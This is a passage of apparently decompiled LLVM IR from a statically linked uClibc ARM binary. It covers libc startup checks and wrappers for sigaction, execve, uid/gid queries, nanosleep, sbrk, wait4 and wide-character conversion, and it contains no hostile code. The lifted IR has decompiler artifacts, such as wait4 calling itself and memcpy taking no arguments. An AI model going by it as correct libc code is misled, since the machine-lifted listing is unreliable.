  br i1 %v2_1610c, label %dec_label_pc_16114, label %dec_label_pc_160f0

dec_label_pc_16114:                               ; preds = %dec_label_pc_16108, %dec_label_pc_160e8
  %v1_16118 = call i32 @_dl_aux_init(i32 %v2_16080)
  store i32 %v1_16118, i32* @r0, align 4
  %v1_1611c = call i32 @__GI___uClibc_init(i32 %v1_16118)
  store i32 %v1_1611c, i32* @r0, align 4
  %v2_16128 = icmp eq i32 %tmp37, 0
  br i1 %v2_16128, label %bb45, label %bb46

bb45:                                             ; preds = %dec_label_pc_16114
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_16114, %bb45
  %v0_16138 = phi i32 [ %tmp37, %dec_label_pc_16114 ], [ 4096, %bb45 ]
  %v3_16130 = icmp eq i32 %tmp36, -1
  %v8_16130 = icmp eq i32 %tmp36, -1
  store i32 ptrtoint (i32* @global_var_33848.986 to i32), i32* @r2, align 4
  store i32 %v0_16138, i32* @global_var_33848.986, align 4
  br i1 %v3_16130, label %dec_label_pc_16140, label %dec_label_pc_16168

dec_label_pc_16140:                               ; preds = %bb46
  %v0_16140 = call i32 @getuid()
  store i32 %v0_16140, i32* @r0, align 4
  store i32 %v0_16140, i32* @r4, align 4
  %v0_16148 = call i32 @geteuid()
  %v0_1614c = load i32, i32* @r4, align 4
  %v9_1614c = icmp eq i32 %v0_1614c, %v0_16148
  br i1 %v9_1614c, label %dec_label_pc_16154, label %dec_label_pc_16190

dec_label_pc_16154:                               ; preds = %dec_label_pc_16140
  %v1_16154 = call i32 @getgid(i32 %v0_16148)
  store i32 %v1_16154, i32* @r0, align 4
  store i32 %v1_16154, i32* @r4, align 4
  %v0_1615c = call i32 @getegid()
  %v0_16160 = load i32, i32* @r4, align 4
  %v9_16160 = icmp eq i32 %v0_16160, %v0_1615c
  br i1 %v9_16160, label %dec_label_pc_16168, label %dec_label_pc_16190

dec_label_pc_16168:                               ; preds = %dec_label_pc_16154, %bb46
  store i32 %tmp36, i32* @r2, align 4
  br i1 %v8_16130, label %dec_label_pc_161fc, label %dec_label_pc_16174

dec_label_pc_16174:                               ; preds = %dec_label_pc_16168
  %v9_16178 = icmp eq i32 %tmp36, %tmp35
  br i1 %v9_16178, label %dec_label_pc_16180, label %dec_label_pc_16190

dec_label_pc_16180:                               ; preds = %dec_label_pc_16174
  br label %dec_label_pc_16190

dec_label_pc_16190:                               ; preds = %dec_label_pc_16180, %dec_label_pc_16174, %dec_label_pc_16154, %dec_label_pc_16140
  %v2_16198 = call i32 @__check_one_fd(i32 0, i32 32768)
  %v2_161a4 = call i32 @__check_one_fd(i32 1, i32 32770)
  %v2_161b0 = call i32 @__check_one_fd(i32 2, i32 32770)
  br label %dec_label_pc_161fc

dec_label_pc_161fc:                               ; preds = %dec_label_pc_16190, %dec_label_pc_16168
  %v0_161c0 = load i32, i32* @r6, align 4
  %v1_161c0 = inttoptr i32 %v0_161c0 to i32*
  %v2_161c0 = load i32, i32* %v1_161c0, align 4
  store i32 %v2_161c0, i32* @global_var_2d5bc, align 4
  store i32 %arg5, i32* @global_var_3384c.1233, align 4
  %v2_161fc = icmp eq i32 %arg4, 0
  br i1 %v2_161fc, label %dec_label_pc_16238, label %bb47

bb47:                                             ; preds = %dec_label_pc_161fc
  br label %dec_label_pc_16238

dec_label_pc_16238:                               ; preds = %dec_label_pc_161fc, %bb47
  call void @__pseudo_branch(i32 %arg4)
  store i32 0, i32* @r5, align 4
  %v1_16248 = call i32 @__errno_location()
  %v2_16250 = inttoptr i32 %v1_16248 to i32*
  store i32 0, i32* %v2_16250, align 4
  %v1_16264 = call i32 @__GI___h_errno_location()
  %v2_1626c = inttoptr i32 %v1_16264 to i32*
  store i32 0, i32* %v2_1626c, align 4
  %v0_1627c = load i32, i32* @r8, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v1_16288 = call i32 @__GI_exit(i32 %v0_1627c)
  ret i32 %v1_16288

; uselistorder directives
  uselistorder i32 %v2_16108, { 1, 0 }
  uselistorder i32 %v1_16104, { 1, 0 }
  uselistorder i1 %v2_160f0, { 1, 0 }
  uselistorder i32 %v4_160d8, { 1, 0, 2 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %tmp36, { 1, 3, 0, 2 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 5, 4, 2, 3, 1 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 1, 0, 2 }
  uselistorder i32* @global_var_33848.986, { 1, 5, 0, 2, 3, 4 }
  uselistorder i32 14, { 2, 0, 1 }
  uselistorder i32 13, { 1, 3, 0, 2 }
  uselistorder i32 120, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16238, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %dec_label_pc_16108, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_160f0, { 1, 0 }
  uselistorder label %bb41, { 1, 0 }
}

define i32 @__libc_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v3_162c0 = load i32, i32* @r4, align 4
  %v6_162c0 = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_162c4 = icmp eq i32* %arg2, null
  %v2_162c8 = ptrtoint i32* %stack_var_-296 to i32
  store i32 %arg1, i32* %r6.global-to-local, align 4
  store i32 %arg3, i32* @r5, align 4
  br i1 %v2_162c4, label %dec_label_pc_16334, label %dec_label_pc_162d8

dec_label_pc_162d8:                               ; preds = %entry
  %v2_162dc = load i32, i32* %arg2, align 4
  %v4_162dc = add i32 %tmp, 4
  store i32 %v4_162dc, i32* @r1, align 4
  %v2_162e0 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_162e0, i32* @r0, align 4
  store i32 128, i32* @r2, align 4
  store i32 %v2_162dc, i32* %stack_var_-156, align 4
  %v0_162ec = call i32 @memcpy()
  store i32 %v0_162ec, i32* %r0.global-to-local, align 4
  %v0_162f0 = load i32, i32* @r4, align 4
  %v1_162f0 = add i32 %v0_162f0, 132
  %v2_162f0 = inttoptr i32 %v1_162f0 to i32*
  %v3_162f0 = load i32, i32* %v2_162f0, align 4
  %v1_162f4 = and i32 %v3_162f0, 67108864
  %v2_162f4 = icmp eq i32 %v1_162f4, 0
  br i1 %v2_162f4, label %dec_label_pc_16308, label %bb

bb:                                               ; preds = %dec_label_pc_162d8
  br label %dec_label_pc_16324

dec_label_pc_16308:                               ; preds = %dec_label_pc_162d8
  %v1_16310 = and i32 %v3_162f0, 4
  %v2_16310 = icmp eq i32 %v1_16310, 0
  br i1 %v2_16310, label %bb21, label %bb20

bb20:                                             ; preds = %dec_label_pc_16308
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_16308, %bb20
  br label %dec_label_pc_16324

dec_label_pc_16324:                               ; preds = %bb, %bb21
  %v2_16324 = icmp eq i32 %v0_162f0, 0
  %v3_16328 = ptrtoint i32* %stack_var_-156 to i32
  %.v3_16328 = select i1 %v2_16324, i32 0, i32 %v3_16328
  %v0_16334.pre = load i32, i32* @r5, align 4
  %v0_16344.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16334

dec_label_pc_16334:                               ; preds = %dec_label_pc_16324, %entry
  %v0_16344 = phi i32 [ %arg1, %entry ], [ %v0_16344.pre, %dec_label_pc_16324 ]
  %v0_16334 = phi i32 [ %arg3, %entry ], [ %v0_16334.pre, %dec_label_pc_16324 ]
  %storemerge = phi i32 [ 0, %entry ], [ %.v3_16328, %dec_label_pc_16324 ]
  store i32 %storemerge, i32* @r1, align 4
  %v2_16334 = icmp eq i32 %v0_16334, 0
  %.v2_162c8 = select i1 %v2_16334, i32 0, i32 %v2_162c8
  store i32 %.v2_162c8, i32* @r2, align 4
  store i32 %v0_16344, i32* %r0.global-to-local, align 4
  %v1_16348 = call i32 @__syscall_rt_sigaction(i32 %v0_16344)
  store i32 %v1_16348, i32* %r0.global-to-local, align 4
  %v0_1634c = load i32, i32* @r5, align 4
  %v2_1634c = icmp eq i32 %v0_1634c, 0
  br i1 %v2_1634c, label %bb26, label %bb25

bb25:                                             ; preds = %dec_label_pc_16334
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_16334, %bb25
  %v0_1635c.pr = phi i32 [ 0, %dec_label_pc_16334 ], [ 1, %bb25 ]
  %v1_16354 = icmp slt i32 %v1_16348, 0
  br i1 %v1_16354, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %bb26
  br label %dec_label_pc_16390

thread-pre-split:                                 ; preds = %bb26
  %v2_1635c = icmp eq i32 %v0_1635c.pr, 0
  store i32 %v1_16348, i32* @r4, align 4
  br i1 %v2_1635c, label %dec_label_pc_16390, label %dec_label_pc_16368

dec_label_pc_16368:                               ; preds = %thread-pre-split
  %v2_16368 = load i32, i32* %stack_var_-296, align 4
  store i32 %v0_1634c, i32* %r0.global-to-local, align 4
  %v2_16370 = inttoptr i32 %v0_1634c to i32*
  store i32 %v2_16368, i32* %v2_16370, align 4
  %v3_16370 = load i32, i32* %r0.global-to-local, align 4
  %v4_16370 = add i32 %v3_16370, 4
  store i32 %v4_16370, i32* @r0, align 4
  %v2_16374 = ptrtoint i32* %stack_var_-284 to i32
  store i32 %v2_16374, i32* @r1, align 4
  store i32 128, i32* @r2, align 4
  %v0_1637c = call i32 @memcpy()
  store i32 %v0_1637c, i32* %r0.global-to-local, align 4
  %v1_16384 = load i32, i32* @r5, align 4
  %v2_16384 = add i32 %v1_16384, 136
  %v3_16384 = inttoptr i32 %v2_16384 to i32*
  %v1_1638c = load i32, i32* @r5, align 4
  %v2_1638c = add i32 %v1_1638c, 132
  %v3_1638c = inttoptr i32 %v2_1638c to i32*
  %v0_16390.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_16390

dec_label_pc_16390:                               ; preds = %thread-pre-split.thread, %thread-pre-split, %dec_label_pc_16368
  %v0_16390 = phi i32 [ %v1_16348, %thread-pre-split ], [ %v0_16390.pre, %dec_label_pc_16368 ], [ %v1_16348, %thread-pre-split.thread ]
  store i32 %v0_16390, i32* %r0.global-to-local, align 4
  store i32 %v3_162c0, i32* @r4, align 4
  store i32 %v6_162c0, i32* @r5, align 4
  ret i32 %v0_16390

; uselistorder directives
  uselistorder i32 %v0_16390, { 1, 0 }
  uselistorder i32 %v0_1634c, { 1, 0, 2 }
  uselistorder i32 %v0_16344, { 1, 0 }
  uselistorder i32* %stack_var_-156, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 3, 6, 5, 7, 0 }
  uselistorder label %dec_label_pc_16390, { 2, 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %dec_label_pc_16324, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v3_163a4 = load i32, i32* @r4, align 4
  store i32 %v3_163a4, i32* %stack_var_-8, align 4
  %v0_163a8 = load i32, i32* @r0, align 4
  %v0_163ac = call i32 @__errno_location()
  %v1_163b0 = sub i32 0, %v0_163a8
  %v2_163b4 = inttoptr i32 %v0_163ac to i32*
  store i32 %v1_163b0, i32* %v2_163b4, align 4
  %v2_163bc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_163bc, i32* @r4, align 4
  ret i32 -1
}

define i32 @__default_sa_restorer(%sigcontext* %scp) local_unnamed_addr {
entry:
  %v3_163c0 = call i32 @sigreturn(%sigcontext* %scp)
  ret i32 %v3_163c0
}

define i32 @__default_rt_sa_restorer(%sigcontext* %scp) local_unnamed_addr {
entry:
  %v3_163c4 = call i32 @sigreturn(%sigcontext* %scp)
  ret i32 %v3_163c4
}

define i32 @__syscall_rt_sigaction(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_163c8 = load i32, i32* @r4, align 4
  store i32 %v3_163c8, i32* %stack_var_-8, align 4
  %v1_163cc = load i32, i32* @r1, align 4
  %v2_163cc = inttoptr i32 %v1_163cc to %sigaction*
  %v3_163cc = load i32, i32* @r2, align 4
  %v4_163cc = inttoptr i32 %v3_163cc to %sigaction*
  %v5_163cc = call i32 @sigaction(i32 %arg1, %sigaction* %v2_163cc, %sigaction* %v4_163cc)
  store i32 %v5_163cc, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_163cc, -4095
  br i1 %tmp, label %dec_label_pc_163ec, label %dec_label_pc_163dc

dec_label_pc_163dc:                               ; preds = %entry
  %v0_163dc = call i32 @__errno_location()
  %v0_163e0 = load i32, i32* %r4.global-to-local, align 4
  %v1_163e0 = sub i32 0, %v0_163e0
  %v2_163e4 = inttoptr i32 %v0_163dc to i32*
  store i32 %v1_163e0, i32* %v2_163e4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_163ec

dec_label_pc_163ec:                               ; preds = %entry, %dec_label_pc_163dc
  %v0_163ec = phi i32 [ %v5_163cc, %entry ], [ -1, %dec_label_pc_163dc ]
  %v2_163f0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_163f0, i32* %r4.global-to-local, align 4
  ret i32 %v0_163ec

; uselistorder directives
  uselistorder i32 %v5_163cc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_163ec, { 1, 0 }
}

define i32 @__GI_execve() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_163f4 = load i32, i32* @r4, align 4
  store i32 %v3_163f4, i32* %stack_var_-8, align 4
  %v0_163f8 = load i32, i32* @r0, align 4
  %v1_163f8 = inttoptr i32 %v0_163f8 to i8*
  %v2_163f8 = load i32, i32* @r1, align 4
  %v3_163f8 = inttoptr i32 %v2_163f8 to i8*
  %v4_163f8 = insertvalue [1 x i8*] undef, i8* %v3_163f8, 0
  %v5_163f8 = load i32, i32* @r2, align 4
  %v6_163f8 = inttoptr i32 %v5_163f8 to i8*
  %v7_163f8 = insertvalue [1 x i8*] undef, i8* %v6_163f8, 0
  %v8_163f8 = call i32 @execve(i8* %v1_163f8, [1 x i8*] %v4_163f8, [1 x i8*] %v7_163f8)
  store i32 %v8_163f8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v8_163f8, -4095
  br i1 %tmp, label %dec_label_pc_16418, label %dec_label_pc_16408

dec_label_pc_16408:                               ; preds = %entry
  %v0_16408 = call i32 @__errno_location()
  %v0_1640c = load i32, i32* %r4.global-to-local, align 4
  %v1_1640c = sub i32 0, %v0_1640c
  %v2_16410 = inttoptr i32 %v0_16408 to i32*
  store i32 %v1_1640c, i32* %v2_16410, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16418

dec_label_pc_16418:                               ; preds = %entry, %dec_label_pc_16408
  %v0_16418 = phi i32 [ %v8_163f8, %entry ], [ -1, %dec_label_pc_16408 ]
  %v2_1641c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1641c, i32* @r4, align 4
  ret i32 %v0_16418

; uselistorder directives
  uselistorder i32 %v8_163f8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16418, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16420 = load i32, i32* @r4, align 4
  store i32 %v3_16420, i32* %stack_var_-8, align 4
  %v0_16428 = load i32, i32* @r0, align 4
  store i32 %v0_16428, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_16428, -4095
  br i1 %tmp, label %dec_label_pc_16444, label %dec_label_pc_16434

dec_label_pc_16434:                               ; preds = %entry
  %v0_16434 = call i32 @__errno_location()
  %v0_16438 = load i32, i32* %r4.global-to-local, align 4
  %v1_16438 = sub i32 0, %v0_16438
  %v2_1643c = inttoptr i32 %v0_16434 to i32*
  store i32 %v1_16438, i32* %v2_1643c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_16448.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_16444

dec_label_pc_16444:                               ; preds = %entry, %dec_label_pc_16434
  %v2_16448 = phi i32 [ %v3_16420, %entry ], [ %v2_16448.pre, %dec_label_pc_16434 ]
  %v0_16444 = phi i32 [ %v0_16428, %entry ], [ -1, %dec_label_pc_16434 ]
  store i32 %v2_16448, i32* @r4, align 4
  ret i32 %v0_16444

; uselistorder directives
  uselistorder i32 %v0_16428, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16444, { 1, 0 }
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1644c = load i32, i32* @r4, align 4
  store i32 %v3_1644c, i32* %stack_var_-8, align 4
  %v0_16454 = load i32, i32* @r0, align 4
  store i32 %v0_16454, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_16454, -4095
  br i1 %tmp, label %dec_label_pc_16470, label %dec_label_pc_16460

dec_label_pc_16460:                               ; preds = %entry
  %v0_16460 = call i32 @__errno_location()
  %v0_16464 = load i32, i32* %r4.global-to-local, align 4
  %v1_16464 = sub i32 0, %v0_16464
  %v2_16468 = inttoptr i32 %v0_16460 to i32*
  store i32 %v1_16464, i32* %v2_16468, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_16474.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_16470

dec_label_pc_16470:                               ; preds = %entry, %dec_label_pc_16460
  %v2_16474 = phi i32 [ %v3_1644c, %entry ], [ %v2_16474.pre, %dec_label_pc_16460 ]
  %v0_16470 = phi i32 [ %v0_16454, %entry ], [ -1, %dec_label_pc_16460 ]
  store i32 %v2_16474, i32* @r4, align 4
  ret i32 %v0_16470

; uselistorder directives
  uselistorder i32 %v0_16454, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16470, { 1, 0 }
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16478 = load i32, i32* @r4, align 4
  store i32 %v3_16478, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_1649c, label %dec_label_pc_1648c

dec_label_pc_1648c:                               ; preds = %entry
  %v0_1648c = call i32 @__errno_location()
  %v0_16490 = load i32, i32* %r4.global-to-local, align 4
  %v1_16490 = sub i32 0, %v0_16490
  %v2_16494 = inttoptr i32 %v0_1648c to i32*
  store i32 %v1_16490, i32* %v2_16494, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_164a0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1649c

dec_label_pc_1649c:                               ; preds = %entry, %dec_label_pc_1648c
  %v2_164a0 = phi i32 [ %v3_16478, %entry ], [ %v2_164a0.pre, %dec_label_pc_1648c ]
  %v0_1649c = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_1648c ]
  store i32 %v2_164a0, i32* %r4.global-to-local, align 4
  ret i32 %v0_1649c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1649c, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_164a4 = load i32, i32* @r4, align 4
  store i32 %v3_164a4, i32* %stack_var_-8, align 4
  %v0_164ac = load i32, i32* @r0, align 4
  store i32 %v0_164ac, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_164ac, -4095
  br i1 %tmp, label %dec_label_pc_164c8, label %dec_label_pc_164b8

dec_label_pc_164b8:                               ; preds = %entry
  %v0_164b8 = call i32 @__errno_location()
  %v0_164bc = load i32, i32* %r4.global-to-local, align 4
  %v1_164bc = sub i32 0, %v0_164bc
  %v2_164c0 = inttoptr i32 %v0_164b8 to i32*
  store i32 %v1_164bc, i32* %v2_164c0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_164cc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_164c8

dec_label_pc_164c8:                               ; preds = %entry, %dec_label_pc_164b8
  %v2_164cc = phi i32 [ %v3_164a4, %entry ], [ %v2_164cc.pre, %dec_label_pc_164b8 ]
  %v0_164c8 = phi i32 [ %v0_164ac, %entry ], [ -1, %dec_label_pc_164b8 ]
  store i32 %v2_164cc, i32* %r4.global-to-local, align 4
  ret i32 %v0_164c8

; uselistorder directives
  uselistorder i32 %v0_164ac, { 1, 0, 2 }
  uselistorder label %dec_label_pc_164c8, { 1, 0 }
}

define i32 @__libc_nanosleep(%timespec* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg2 to %timespec*
  %stack_var_-8 = alloca i32, align 4
  %v3_164d0 = load i32, i32* @r4, align 4
  store i32 %v3_164d0, i32* %stack_var_-8, align 4
  %v6_164d4 = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp)
  store i32 %v6_164d4, i32* %r4.global-to-local, align 4
  %tmp6 = icmp ult i32 %v6_164d4, -4095
  br i1 %tmp6, label %dec_label_pc_164f4, label %dec_label_pc_164e4

dec_label_pc_164e4:                               ; preds = %entry
  %v0_164e4 = call i32 @__errno_location()
  %v0_164e8 = load i32, i32* %r4.global-to-local, align 4
  %v1_164e8 = sub i32 0, %v0_164e8
  %v2_164ec = inttoptr i32 %v0_164e4 to i32*
  store i32 %v1_164e8, i32* %v2_164ec, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_164f4

dec_label_pc_164f4:                               ; preds = %entry, %dec_label_pc_164e4
  %v0_164f4 = phi i32 [ %v6_164d4, %entry ], [ -1, %dec_label_pc_164e4 ]
  %v2_164f8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_164f8, i32* %r4.global-to-local, align 4
  ret i32 %v0_164f4

; uselistorder directives
  uselistorder i32 %v6_164d4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_164f4, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_164fc = load i32, i32* @r4, align 4
  store i32 %v3_164fc, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i32* @global_var_3387c.1267 to i32), i32* %r4.global-to-local, align 4
  %v2_16504 = load i32, i32* @global_var_3387c.1267, align 4
  %v2_16508 = icmp eq i32 %v2_16504, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_16508, label %dec_label_pc_16518, label %dec_label_pc_16524

dec_label_pc_16518:                               ; preds = %entry
  %v2_16518 = call i32 @__GI_brk(i32* null)
  %v1_1651c = icmp slt i32 %v2_16518, 0
  br i1 %v1_1651c, label %dec_label_pc_16544, label %dec_label_pc_16524thread-pre-split

dec_label_pc_16524thread-pre-split:               ; preds = %dec_label_pc_16518
  %v0_16528.pr = load i32, i32* %r5.global-to-local, align 4
  %v2_16524.pre = load i32, i32* @global_var_3387c.1267, align 4
  br label %dec_label_pc_16524

dec_label_pc_16524:                               ; preds = %dec_label_pc_16524thread-pre-split, %entry
  %v2_16524 = phi i32 [ %v2_16524.pre, %dec_label_pc_16524thread-pre-split ], [ %v2_16504, %entry ]
  %v1_16530 = phi i32 [ %v0_16528.pr, %dec_label_pc_16524thread-pre-split ], [ %arg1, %entry ]
  %v2_16528 = icmp eq i32 %v1_16530, 0
  store i32 %v2_16524, i32* %r4.global-to-local, align 4
  br i1 %v2_16528, label %dec_label_pc_16548, label %dec_label_pc_16538

dec_label_pc_16538:                               ; preds = %dec_label_pc_16524
  %v2_16530 = add i32 %v1_16530, %v2_16524
  %v1_16538 = inttoptr i32 %v2_16530 to i32*
  %v2_16538 = call i32 @__GI_brk(i32* %v1_16538)
  %v1_1653c = icmp slt i32 %v2_16538, 0
  br i1 %v1_1653c, label %dec_label_pc_16544, label %dec_label_pc_16538.dec_label_pc_16548_crit_edge

dec_label_pc_16538.dec_label_pc_16548_crit_edge:  ; preds = %dec_label_pc_16538
  %v0_16548.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16548

dec_label_pc_16544:                               ; preds = %dec_label_pc_16538, %dec_label_pc_16518
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16548

dec_label_pc_16548:                               ; preds = %dec_label_pc_16538.dec_label_pc_16548_crit_edge, %dec_label_pc_16524, %dec_label_pc_16544
  %v0_16548 = phi i32 [ %v0_16548.pre, %dec_label_pc_16538.dec_label_pc_16548_crit_edge ], [ %v2_16524, %dec_label_pc_16524 ], [ -1, %dec_label_pc_16544 ]
  %v2_1654c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1654c, i32* @r4, align 4
  ret i32 %v0_16548

; uselistorder directives
  uselistorder i32 %v2_16524, { 1, 0, 2 }
  uselistorder i32* null, { 0, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 14, 12, 15, 16, 17, 18, 24, 25, 22, 23, 21, 20, 19, 26, 27, 28, 2 }
  uselistorder label %dec_label_pc_16548, { 2, 0, 1 }
}

define i32 @wait4() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16554 = load i32, i32* @r4, align 4
  store i32 %v3_16554, i32* %stack_var_-8, align 4
  %v0_16558 = call i32 @wait4()
  store i32 %v0_16558, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_16558, -4095
  br i1 %tmp, label %dec_label_pc_16578, label %dec_label_pc_16568

dec_label_pc_16568:                               ; preds = %entry
  %v0_16568 = call i32 @__errno_location()
  %v0_1656c = load i32, i32* %r4.global-to-local, align 4
  %v1_1656c = sub i32 0, %v0_1656c
  %v2_16570 = inttoptr i32 %v0_16568 to i32*
  store i32 %v1_1656c, i32* %v2_16570, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16578

dec_label_pc_16578:                               ; preds = %entry, %dec_label_pc_16568
  %v0_16578 = phi i32 [ %v0_16558, %entry ], [ -1, %dec_label_pc_16568 ]
  %v2_1657c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1657c, i32* @r4, align 4
  ret i32 %v0_16578

; uselistorder directives
  uselistorder i32 %v0_16558, { 1, 0, 2 }
  uselistorder i32 ()* @wait4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16578, { 1, 0 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_3385c.1269 to i32)
}

define i32 @__GI_wcrtomb(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v2_16590 = icmp eq i32 %arg1, 0
  br i1 %v2_16590, label %bb, label %.thread

.thread:                                          ; preds = %entry
  br label %bb11

bb:                                               ; preds = %entry
  %v3_16598 = ptrtoint i32* %stack_var_-32 to i32
  br label %bb11

bb11:                                             ; preds = %.thread, %bb
  %v0_165c0 = phi i32 [ %arg2, %.thread ], [ 0, %bb ]
  %v0_165b4 = phi i32 [ %arg1, %.thread ], [ %v3_16598, %bb ]
  store i32 %arg3, i32* @r4, align 4
  store i32 16, i32* @r3, align 4
  %v2_165ac = ptrtoint i32* %stack_var_-16 to i32
  %v2_165b8 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_165b8, i32* %stack_var_-16, align 4
  store i32 %v0_165c0, i32* %stack_var_-12, align 4
  %v5_165c8 = inttoptr i32 %v0_165b4 to i8*
  %v6_165c8 = call i32 @__GI_wcsnrtombs(i8* %v5_165c8, i32 %v2_165ac, i32 1, i32 16, i32 %arg3)
  %v2_165cc = icmp eq i32 %v6_165c8, 0
  br i1 %v2_165cc, label %bb12, label %bb13

bb12:                                             ; preds = %bb11
  br label %bb13

bb13:                                             ; preds = %bb11, %bb12
  %v8_165d8 = phi i32 [ %v6_165c8, %bb11 ], [ 1, %bb12 ]
  ret i32 %v8_165d8

; uselistorder directives
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %bb13, { 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @__GI_wcsrtombs() local_unnamed_addr {
entry:
  %v0_165e8 = load i32, i32* @r2, align 4
  store i32 %v0_165e8, i32* @r3, align 4
  %v0_165f0 = load i32, i32* @r0, align 4
  %v1_165f0 = load i32, i32* @r1, align 4
  %v5_165f0 = inttoptr i32 %v0_165f0 to i8*
  %v6_165f0 = call i32 @__GI_wcsnrtombs(i8* %v5_165f0, i32 %v1_165f0, i32 -1, i32 %v0_165e8, i32 ptrtoint (i32* @0 to i32))
  ret i32 %v6_165f0
}

define i32 @__GI_wcsnrtombs(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
